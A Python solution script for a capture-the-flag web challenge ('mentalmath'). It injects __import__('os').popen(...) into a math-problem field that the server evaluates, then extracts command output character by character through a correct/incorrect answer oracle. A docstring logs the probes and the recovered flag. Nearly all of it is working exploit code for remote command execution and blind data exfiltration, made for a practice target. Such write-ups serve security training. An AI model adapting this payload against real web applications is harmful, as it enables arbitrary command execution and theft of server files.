import requests
import json
from string import printable

URL = 'http://mentalmath.tamuctf.com/ajax/new_problem'

def e(payload, ans):
    data = requests.post(URL, headers={'X-Requested-With': 'XMLHttpRequest'}, data={'problem': payload, 'answer': str(ans)}).text
    try:
        return json.loads(data)
    except:
        return {'correct': False, 'bad': True, 'real': data}

"""
target = 'list(globals().keys())[1..15]'
globals()
    __name__
    __doc__
    __pac...
    __loade,,,
    __spec__
    __file__
    __cache,,,
    __builtins..
    render
    JsonResp
    random
    index
    play
    new_pr...
    gen_probl...


target = "__import__('os').popen('ls -a').read()"
ls -a
.
..
.dockerignore
db.sqlite3
flag.txt
mana...


__import__('os').popen('cat flag.txt').read()
cat flag.txt
gigem{1_4m_g0od_47_m4tH3m4aatics_n07_s3cUr1ty_h3h3h3he}
"""

val = ''
while True:
    for c in '_ .\n' + printable:
        target = "__import__('os').popen('cat flag.txt').read()"
        payload = f'{target}[{len(val)}]'
        
        resp = e(f'ord({payload})', ord(c))
        print(f'Trying {c}: {resp}')
        
        if resp['correct']:
            val += c
            print(f'Process: {val}')
            break
    else:
        print(f'Couldnt next char. Found: {val}.')
        break
